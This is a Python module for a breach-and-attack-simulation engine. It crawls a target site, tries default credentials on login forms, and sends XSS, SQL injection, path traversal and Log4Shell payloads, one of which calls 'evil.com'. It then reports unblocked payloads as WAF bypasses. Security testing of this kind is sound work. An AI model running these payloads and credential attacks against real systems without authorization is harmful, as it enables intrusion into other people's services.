"""
Adaptive APT Kill Chain v3
Enterprise Adaptive BAS Engine

Features:
- Dynamic target support
- Recursive link discovery
- Technology fingerprinting
- Login discovery
- Admin discovery
- OWASP validation
- Persistence probing
- WAF-aware behavior
- Adaptive attack paths
- Smart recon filtering
"""

import aiohttp
import asyncio
import urllib.parse
import re

from bs4 import BeautifulSoup
from urllib.parse import (
    urlparse,
    urljoin,
)

from .base import BaseAttackModule
from bas_engine.models.simulation import Severity


# =========================================================
# CONFIG
# =========================================================

FAST_MODE = True

MAX_REQUESTS = 80

DELAY_BETWEEN = 0.12

MAX_RECURSIVE_LINKS = 25

COMMON_DISCOVERY_PATHS = [

    "/",
    "/login",
    "/signin",
    "/admin",
    "/dashboard",
    "/api",
    "/graphql",
    "/upload",
    "/register",
    "/auth",
    "/manage",
    "/config",
]

COMMON_ADMIN_PATHS = [

    "/admin",
    "/admin/login",
    "/dashboard",
    "/manage",
    "/config",
    "/settings",
    "/administrator",
    "/console",
]

COMMON_PERSISTENCE_PATHS = [

    "/upload",
    "/uploads",
    "/backup",
    "/backups",
    "/plugins",
    "/extensions",
    "/api/upload",
    "/storage",
]

LOGIN_WORDS = [

    "login",
    "signin",
    "username",
    "password",
    "email",
]

PAYLOADS = [

    (
        "XSS",
        "<script>alert(1)</script>",
        "T1190",
    ),

    (
        "SQLI",
        "' UNION SELECT NULL,NULL--",
        "T1190",
    ),

    (
        "TRAVERSAL",
        "../../../../etc/passwd",
        "T1190",
    ),

    (
        "LOG4SHELL",
        "${jndi:ldap://evil.com/x}",
        "T1190",
    ),
]

CREDENTIAL_LIST = [

    ("admin", "admin"),
    ("admin", "password"),
    ("administrator", "administrator"),
    ("test", "test"),
    ("user", "password"),
]


# =========================================================
# STATE
# =========================================================

class KillChainState:

    def __init__(self):

        self.discovery = {

            "logins": [],
            "admin_panels": [],
            "forms": [],
            "technologies": [],
            "uploads": [],
            "api_endpoints": [],
            "links": [],
        }

        self.authenticated = False

        self.valid_creds = None

        self.stage_results = {}

        self.attack_results = []

        self.request_count = 0


    def record_stage(

        self,

        stage_num,
        name,
        status,
        detail,
    ):

        self.stage_results[stage_num] = {

            "stage": stage_num,
            "name": name,
            "status": status,
            "detail": detail,
        }

        icon = {

            "success": "✓",
            "partial": "⚠",
            "error": "✗",

        }.get(status, "?")

        print(
            f"\n[{icon}] Stage "
            f"{stage_num}: {name}"
        )

        print(f"    {detail}")


# =========================================================
# MODULE
# =========================================================

class APTKillChainModule(BaseAttackModule):

    MODULE_NAME = "apt_killchain"

    DESCRIPTION = (
        "Adaptive enterprise kill chain simulation"
    )

    MITRE_TACTIC = "Multiple"

    MITRE_IDS = [

        "T1595",
        "T1110",
        "T1078",
        "T1190",
        "T1548",
        "T1505",
    ]


    # =====================================================
    # URL HELPERS
    # =====================================================

    def normalize_url(self, path):

        parsed = urlparse(self.target)

        base = f"{parsed.scheme}://{parsed.netloc}"

        return urljoin(base, path)


    def same_domain(

        self,

        url,
    ):

        try:

            return (

                urlparse(url).netloc
                ==
                urlparse(self.target).netloc
            )

        except:
            return False


    # =====================================================
    # TECHNOLOGY FINGERPRINTING
    # =====================================================

    def fingerprint_technologies(

        self,

        headers,

        body,
    ):

        tech = set()

        server = headers.get(
            "server",
            ""
        ).lower()

        powered = headers.get(
            "x-powered-by",
            ""
        ).lower()

        body = body.lower()

        # -------------------------------------------------
        # SERVERS
        # -------------------------------------------------

        if "nginx" in server:
            tech.add("nginx")

        if "apache" in server:
            tech.add("apache")

        if "iis" in server:
            tech.add("iis")

        if "tomcat" in server:
            tech.add("tomcat")

        # -------------------------------------------------
        # BACKEND
        # -------------------------------------------------

        if "php" in powered \
        or "php" in body:

            tech.add("php")

        if "django" in body:
            tech.add("django")

        if "flask" in body:
            tech.add("flask")

        if "laravel" in body:
            tech.add("laravel")

        if "express" in body:
            tech.add("express")

        # -------------------------------------------------
        # FRONTEND
        # -------------------------------------------------

        if "react" in body:
            tech.add("react")

        if "next.js" in body:
            tech.add("nextjs")

        if "vue" in body:
            tech.add("vue")

        if "angular" in body:
            tech.add("angular")

        # -------------------------------------------------
        # CMS
        # -------------------------------------------------

        if "wordpress" in body:
            tech.add("wordpress")

        if "drupal" in body:
            tech.add("drupal")

        if "joomla" in body:
            tech.add("joomla")

        return list(tech)


    # =====================================================
    # RECURSIVE LINK DISCOVERY
    # =====================================================

    async def recursive_discovery(

        self,

        session,

        state,

        url,
    ):

        if len(
            state.discovery["links"]
        ) >= MAX_RECURSIVE_LINKS:

            return

        try:

            async with session.get(

                url,

                ssl=False,

                timeout=6,

                allow_redirects=True

            ) as resp:

                body = await resp.text()

                soup = BeautifulSoup(
                    body,
                    "html.parser"
                )

                for tag in soup.find_all("a"):

                    href = tag.get("href")

                    if not href:
                        continue

                    full = urljoin(
                        url,
                        href
                    )

                    if not self.same_domain(full):
                        continue

                    if full in state.discovery["links"]:
                        continue

                    state.discovery[
                        "links"
                    ].append(full)

        except:
            pass


    # =====================================================
    # STAGE 1 — RECON
    # =====================================================

    async def stage_recon(

        self,

        session,

        state,
    ):

        print(
            "\n=== STAGE 1 — RECON ==="
        )

        discovered = []

        for path in COMMON_DISCOVERY_PATHS:

            url = self.normalize_url(path)

            try:

                async with session.get(

                    url,

                    ssl=False,

                    timeout=6,

                    allow_redirects=True

                ) as resp:

                    status = resp.status

                    body = await resp.text()

                    headers = {

                        k.lower(): v

                        for k, v
                        in resp.headers.items()
                    }

                    print(
                        f"[{status}] {url}"
                    )

                    # ---------------------------------
                    # REAL DISCOVERY
                    # ---------------------------------

                    if status in [

                        200,
                        301,
                        302,
                        401,
                        403,
                    ]:

                        discovered.append(url)

                    # ---------------------------------
                    # TECH FINGERPRINTING
                    # ---------------------------------

                    tech = self.fingerprint_technologies(

                        headers,
                        body
                    )

                    for t in tech:

                        if t not in state.discovery[
                            "technologies"
                        ]:

                            state.discovery[
                                "technologies"
                            ].append(t)

                    # ---------------------------------
                    # LOGIN FORM DISCOVERY
                    # ---------------------------------

                    soup = BeautifulSoup(
                        body,
                        "html.parser"
                    )

                    forms = soup.find_all("form")

                    for form in forms:

                        form_text = str(form).lower()

                        if any(

                            word in form_text

                            for word in LOGIN_WORDS
                        ):

                            if url not in state.discovery[
                                "logins"
                            ]:

                                state.discovery[
                                    "logins"
                                ].append(url)

                    # ---------------------------------
                    # ADMIN PANELS
                    # ---------------------------------

                    if any(

                        x in url.lower()

                        for x in [
                            "admin",
                            "dashboard",
                            "manage"
                        ]
                    ):

                        state.discovery[
                            "admin_panels"
                        ].append(url)

                    # ---------------------------------
                    # API DETECTION
                    # ---------------------------------

                    if any(

                        x in url.lower()

                        for x in [
                            "api",
                            "graphql"
                        ]
                    ):

                        state.discovery[
                            "api_endpoints"
                        ].append(url)

                    # ---------------------------------
                    # RECURSIVE LINKS
                    # ---------------------------------

                    await self.recursive_discovery(

                        session,
                        state,
                        url
                    )

            except Exception as e:

                print(f"[E] {url} : {e}")

            await asyncio.sleep(
                DELAY_BETWEEN
            )

        state.record_stage(

            1,

            "Reconnaissance",

            "success",

            f"Discovered "
            f"{len(discovered)} "
            f"valid endpoints | "
            f"{len(state.discovery['links'])} "
            f"recursive links | "
            f"Technologies: "
            f"{', '.join(state.discovery['technologies']) or 'none'}"
        )


    # =====================================================
    # STAGE 2 — LOGIN ATTACK
    # =====================================================

    async def stage_login_attack(

        self,

        session,

        state,
    ):

        print(
            "\n=== STAGE 2 — LOGIN ATTACK ==="
        )

        if not state.discovery["logins"]:

            state.record_stage(

                2,

                "Credential Attack",

                "partial",

                "No login forms discovered"
            )

            return

        attempts = 0

        for login_url in state.discovery["logins"]:

            for username, password in CREDENTIAL_LIST:

                if state.request_count >= MAX_REQUESTS:
                    break

                attempts += 1

                try:

                    data = {

                        "username": username,
                        "password": password,
                    }

                    async with session.post(

                        login_url,

                        data=data,

                        ssl=False,

                        allow_redirects=False,

                        timeout=6

                    ) as resp:

                        status = resp.status

                        print(
                            f"[{status}] "
                            f"{username}:{password}"
                        )

                        state.request_count += 1

                        # -------------------------
                        # SUCCESS HEURISTICS
                        # -------------------------

                        if status in [

                            200,
                            302,
                            303
                        ]:

                            cookies = resp.cookies

                            if cookies:

                                state.authenticated = True

                                state.valid_creds = (
                                    username,
                                    password
                                )

                                state.record_stage(

                                    2,

                                    "Credential Attack",

                                    "success",

                                    f"Possible credentials: "
                                    f"{username}:{password}"
                                )

                                return

                except Exception as e:

                    print(f"[E] {e}")

                await asyncio.sleep(
                    DELAY_BETWEEN
                )

        state.record_stage(

            2,

            "Credential Attack",

            "partial",

            f"{attempts} attempts completed"
        )


    # =====================================================
    # STAGE 3 — SESSION VALIDATION
    # =====================================================

    async def stage_session_validation(

        self,

        session,

        state,
    ):

        print(
            "\n=== STAGE 3 — SESSION VALIDATION ==="
        )

        if state.authenticated:

            state.record_stage(

                3,

                "Credential Use",

                "success",

                "Authenticated session established"
            )

        else:

            state.record_stage(

                3,

                "Credential Use",

                "partial",

                "No authenticated session"
            )


    # =====================================================
    # STAGE 4 — OWASP ATTACKS
    # =====================================================

    async def stage_owasp(

        self,

        session,

        state,
    ):

        print(
            "\n=== STAGE 4 — OWASP ATTACKS ==="
        )

        blocked = 0

        bypassed = 0

        targets = (

            state.discovery["logins"]
            +
            state.discovery["links"]
        )

        targets = list(set(targets))

        if not targets:

            state.record_stage(

                4,

                "OWASP Attacks",

                "partial",

                "No attackable endpoints discovered"
            )

            return

        for url in targets[:15]:

            for label, payload, mitre in PAYLOADS:

                if state.request_count >= MAX_REQUESTS:
                    break

                attack_url = (

                    f"{url}"

                    f"?q="

                    f"{urllib.parse.quote(payload)}"
                )

                try:

                    async with session.get(

                        attack_url,

                        ssl=False,

                        allow_redirects=False,

                        timeout=6

                    ) as resp:

                        status = resp.status

                        state.request_count += 1

                        if status in [

                            403,
                            406,
                            429
                        ]:

                            blocked += 1

                            outcome = "BLOCKED"

                        else:

                            bypassed += 1

                            outcome = "BYPASSED"

                        print(
                            f"[{outcome}] "
                            f"{label} "
                            f"{status}"
                        )

                        state.attack_results.append({

                            "label": label,
                            "status": status,
                            "url": attack_url,
                            "blocked":
                                outcome == "BLOCKED",
                        })

                except Exception as e:

                    print(f"[E] {e}")

                await asyncio.sleep(
                    DELAY_BETWEEN
                )

        state.record_stage(

            4,

            "OWASP Attacks",

            "success",

            f"Blocked={blocked} "
            f"Bypassed={bypassed}"
        )


    # =====================================================
    # STAGE 5 — PRIV ESC
    # =====================================================

    async def stage_priv_esc(

        self,

        session,

        state,
    ):

        print(
            "\n=== STAGE 5 — PRIV ESC ==="
        )

        accessible = []

        for path in COMMON_ADMIN_PATHS:

            url = self.normalize_url(path)

            try:

                async with session.get(

                    url,

                    ssl=False,

                    allow_redirects=False,

                    timeout=6

                ) as resp:

                    status = resp.status

                    print(
                        f"[{status}] {url}"
                    )

                    if status == 200:

                        accessible.append(url)

            except Exception as e:

                print(f"[E] {e}")

            await asyncio.sleep(
                DELAY_BETWEEN
            )

        if accessible:

            state.record_stage(

                5,

                "Privilege Escalation",

                "partial",

                f"{len(accessible)} "
                f"admin endpoints accessible"
            )

        else:

            state.record_stage(

                5,

                "Privilege Escalation",

                "success",

                "No exposed admin endpoints"
            )


    # =====================================================
    # STAGE 6 — PERSISTENCE
    # =====================================================

    async def stage_persistence(

        self,

        session,

        state,
    ):

        print(
            "\n=== STAGE 6 — PERSISTENCE ==="
        )

        risky = []

        for path in COMMON_PERSISTENCE_PATHS:

            url = self.normalize_url(path)

            try:

                async with session.get(

                    url,

                    ssl=False,

                    allow_redirects=False,

                    timeout=6

                ) as resp:

                    status = resp.status

                    print(
                        f"[{status}] {url}"
                    )

                    if status == 200:

                        risky.append(url)

            except Exception as e:

                print(f"[E] {e}")

            await asyncio.sleep(
                DELAY_BETWEEN
            )

        if risky:

            state.record_stage(

                6,

                "Persistence Probe",

                "partial",

                f"{len(risky)} "
                f"persistence paths exposed"
            )

        else:

            state.record_stage(

                6,

                "Persistence Probe",

                "success",

                "No persistence paths exposed"
            )


    # =====================================================
    # EXECUTION
    # =====================================================

    async def execute(self):

        findings = []

        state = KillChainState()

        print("\n" + "=" * 60)

        print(
            "Adaptive APT Kill Chain v3"
        )

        print(
            f"TARGET: {self.target}"
        )

        print("=" * 60)

        connector = aiohttp.TCPConnector(
            ssl=False
        )

        async with aiohttp.ClientSession(

            connector=connector

        ) as session:

            await self.stage_recon(
                session,
                state
            )

            await self.stage_login_attack(
                session,
                state
            )

            await self.stage_session_validation(
                session,
                state
            )

            await self.stage_owasp(
                session,
                state
            )

            await self.stage_priv_esc(
                session,
                state
            )

            await self.stage_persistence(
                session,
                state
            )

        # =================================================
        # MAIN STAGE FINDINGS
        # =================================================

        for stage_num, result in state.stage_results.items():

            severity = Severity.MEDIUM

            if result["status"] == "partial":

                severity = Severity.HIGH

            if result["status"] == "error":

                severity = Severity.CRITICAL

            findings.append(

                self.finding(

                    title=(
                        f"APT Stage "
                        f"{stage_num}: "
                        f"{result['name']}"
                    ),

                    description=result["detail"],

                    severity=severity,

                    mitre_id=(
                        self.MITRE_IDS[
                            stage_num - 1
                        ]
                    ),

                    raw_data=result,
                )
            )

        # =================================================
        # WAF BYPASS FINDINGS
        # =================================================

        for attack in state.attack_results:

            if attack["blocked"] is False:

                findings.append(

                    self.finding(

                        title=(
                            f"WAF Bypass: "
                            f"{attack['label']}"
                        ),

                        description=(
                            f"Payload not blocked"
                        ),

                        severity=Severity.CRITICAL,

                        mitre_id="T1190",

                        raw_data=attack,
                    )
                )

        return findings